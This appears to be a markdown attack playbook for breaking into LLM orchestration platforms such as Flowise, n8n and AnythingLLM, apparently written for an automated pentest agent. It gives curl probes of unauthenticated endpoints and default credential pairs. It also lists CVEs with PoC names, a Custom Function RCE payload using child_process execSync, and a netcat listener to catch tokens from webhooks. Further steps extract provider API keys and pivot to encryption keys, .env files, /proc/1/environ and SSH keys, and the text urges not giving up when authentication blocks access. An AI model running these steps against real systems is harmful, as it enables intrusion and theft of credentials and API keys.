# Archetype: AI Orchestration / LLM Platform

**Match if you see:** Flowise, LangChain Server, AnythingLLM, Dify, n8n,
LiteLLM, ChatBot UIs, OpenWebUI, anything that exposes LLM workflows as a
web app.

## Why these are juicy

LLM orchestration platforms are a goldmine because they:
- Run untrusted code as a feature (custom function nodes, tool nodes)
- Expose API keys to multiple LLM providers in their config
- Often ship with weak default auth, demo accounts, or "open by default" modes
- Have multiple HTTP endpoints — many added recently and lightly tested
- Almost always run as root or in containers with mounted secrets

## Fast checks (≤ 5 min)

```bash
# 1) Identify version
curl -s http://target/api/v1/version           # Flowise
curl -s http://target/api/v1/info               # n8n
curl -s http://target/api/version               # AnythingLLM
curl -s http://target/api/health                # generic
curl -s http://target/.well-known/version

# 2) Common unauth endpoints (Flowise specifically)
curl -s http://target/api/v1/public-chatflows
curl -s http://target/api/v1/public-chatbotConfig/<id>
curl -s http://target/api/v1/get-upload-file
curl -s http://target/api/v1/prediction/<id>    # may be unauth even if UI requires login

# 3) Look for API docs / Swagger
curl -s http://target/api/docs
curl -s http://target/swagger
curl -s http://target/openapi.json
curl -s http://target/api/v1/spec

# 4) Default creds (try BEFORE brute force)
admin / admin
admin / changeme
admin / password
admin@flowise.com / admin
admin@example.com / admin
```

## Deep checks

### A. Source dive (do this BEFORE giving up on auth)
```bash
# Flowise
bash scripts/source-dive.sh FlowiseAI/Flowise <version-tag>
# n8n
bash scripts/source-dive.sh n8n-io/n8n <version-tag>
# AnythingLLM
bash scripts/source-dive.sh Mintplex-Labs/anything-llm
# Dify
bash scripts/source-dive.sh langgenius/dify
```

Then read the generated `source-dive.md`:
- **Section A** → routes that bypass auth
- **Section C** → auth middleware (look for header bypasses like `x-request-from`, `127.0.0.1`)
- **Section I** → recent security commits = your CVE map

### B. Known CVEs to try (Flowise)
- **CVE-2025-59528** (Flowise ≤ 3.0.5) — RCE via CustomMCP node, requires auth.
  PoCs: `maradonam18/CVE-2025-59528-PoC`, exploit-db `nltt0`.
- **CVE-2024-31621** (Flowise < 1.6.5) — auth bypass via `x-request-from` header.
- **CVE-2025-26319** — pre-auth file upload + RCE in custom function loader.

### C. Custom tool / function abuse (post-auth)
If you get auth (default creds, leaked token, registered account):
- Create a chatflow with a "Custom Function" node containing
  `process.mainModule.require('child_process').execSync('id').toString()`
- Or "Custom Tool" with shell escape in the description/example.
- Test prompts → execution.

### D. Webhook callbacks
Many AI platforms accept user-controlled webhook URLs. Point one at your
listener (`nc -lnvp 4444`) to leak headers including auth tokens.

### E. Provider key extraction
After auth, hit `/api/v1/credentials` → it usually returns provider API keys
(OpenAI, Anthropic, etc). These are valuable in their own right and may be
reusable for further pivoting (e.g. AWS keys).

## Common pitfalls (the silentium failure mode)

1. **"Needs auth → I give up"** — DON'T. Source-dive first. Most of these apps
   have at least 2-3 unauth endpoints by design.
2. **Trying default creds and stopping** — also try registering a new account
   (often allowed by default). Also try the team-page emails as usernames.
3. **Treating SPA 200s as files** — every path returns the SPA HTML. Don't
   trust ffuf size matches; check actual response.
4. **Ignoring the `/api/v1/prediction` endpoint** — sometimes the chatflow ID
   is guessable (`test`, `demo`, sequential UUIDs leaked elsewhere).

## Pivot targets after access

- `~/.flowise/database.sqlite` — user table, hashed pw, encrypted creds
- `~/.flowise/encryption.key` — decrypts those creds
- `/etc/flowise/.env` — provider keys
- Container env vars (`/proc/1/environ`)
- Host SSH keys (since Flowise often runs as root or with `--privileged`)
